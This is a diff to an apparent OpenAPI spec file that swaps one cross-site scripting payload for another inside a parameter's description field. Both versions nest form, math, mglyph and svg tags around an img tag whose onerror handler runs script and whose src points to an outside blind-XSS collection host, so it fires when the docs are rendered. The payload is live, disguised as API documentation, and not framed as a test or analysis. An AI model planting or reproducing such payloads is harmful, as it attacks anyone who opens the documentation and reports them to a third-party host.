@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<img src='https://xss.report/c/santik86' onerror=alert('Your system has been hacked!') src='https://xss.report/c/santiko86'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><img src='https://xss.report/c/santik86' onerror=alert('Your system has been hacked!') src='https://xss.report/c/santiko86'>"></form>
 
           format: int64
           in: path
